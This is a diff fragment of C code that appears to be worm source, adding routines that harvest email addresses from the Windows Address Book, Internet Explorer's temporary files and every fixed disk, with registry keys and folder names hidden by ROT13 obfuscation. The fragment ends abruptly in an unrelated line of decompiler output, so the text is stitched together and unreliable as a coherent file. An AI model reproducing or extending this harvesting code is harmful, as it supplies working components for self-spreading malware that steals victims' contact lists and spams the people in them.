+	base1 = *((DWORD *)(ptr + 0x60));
+	cnt = *((DWORD *)(ptr + 0x64));
+
+	for (i=0; i<cnt; i++) {
+		b = base1 + i * 68;
+		memset(email, '\0', sizeof(email));
+		for (j=0; (b < maxsize) && (j < 68); j++, b+=2) {
+			email[j] = ptr[b];
+			if (ptr[b] == 0) break;
+		}
+		if (j > 0)
+			scan_out(email);
+	}
+
+	UnmapViewOfFile(ptr);
+	CloseHandle(hMap);
+	CloseHandle(hFile);
+	return 0;
+}
+
+static void scan_default_wab()
+{
+	HKEY k;
+	DWORD dw;
+	char key_path[80], wabpath[256];
+
+	/* "Software\\Microsoft\\WAB\\WAB4\\Wab File Name" */
+	rot13(key_path, "Fbsgjner\\Zvpebfbsg\\JNO\\JNO4\\Jno Svyr Anzr");
+	if (RegOpenKeyEx(HKEY_CURRENT_USER, key_path, 0, KEY_READ, &k) != 0)
+		return;
+	memset(wabpath, '\0', sizeof(wabpath));
+	dw = sizeof(wabpath);
+	RegQueryValueEx(k, NULL, NULL, NULL, wabpath, &dw);
+	RegCloseKey(k);
+	if (wabpath[0] != 0)
+		scan_wab(wabpath);
+}
+
+//-----------------------------------------------------------------------------
+
+void scan_ietemp()
+{
+	char buf[MAX_PATH+128];
+	char sz_ls[64], sz_tif[64];
+	int i;
+
+	rot13(sz_tif, "Grzcbenel Vagrearg Svyrf");  /* "Temporary Internet Files" */
+	rot13(sz_ls, "Ybpny Frggvatf");             /* "Local Settings" */
+
+	for (i=0; i<2; i++) {
+		memset(buf, 0, sizeof(buf));
+		if (i == 0)
+			GetWindowsDirectory(buf, sizeof(buf));
+		else
+			GetEnvironmentVariable("USERPROFILE", buf, sizeof(buf));
+		if (buf[0] == 0) continue;
+		if (buf[lstrlen(buf)-1] != '\\') lstrcat(buf, "\\");
+		if (i == 1) {
+			lstrcat(buf, sz_ls);
+			lstrcat(buf, "\\");
+		}
+		lstrcat(buf, sz_tif);
+		scan_dir1(buf, 5);
+	}
+}
+
+void scan_disks()
+{
+	char buf[MAX_PATH], sysdisk;
+
+	memset(buf, 0, sizeof(buf));
+	GetSystemDirectory(buf, sizeof(buf));
+	sysdisk = buf[0];
+
+	lstrcpy(buf+1, ":\\");
+	scan_dir1(buf, 15);
+
+	for (buf[0]='C'; buf[0]<'Z'; buf[0]++) {
+		if (buf[0] == sysdisk) continue;
+		switch (GetDriveType(buf)) {
+			case DRIVE_FIXED:
+			case DRIVE_RAMDISK:
+				break;
+			default:
+				continue;
+		}
+		Sleep(8096);
+		scan_dir1(buf, 15);
+	}
+}
+
 // Address range: 0x4076b0 - 0x40771f
 int32_t function_4076b0(char * a1) {
     int32_t v1 = (int32_t)a1;
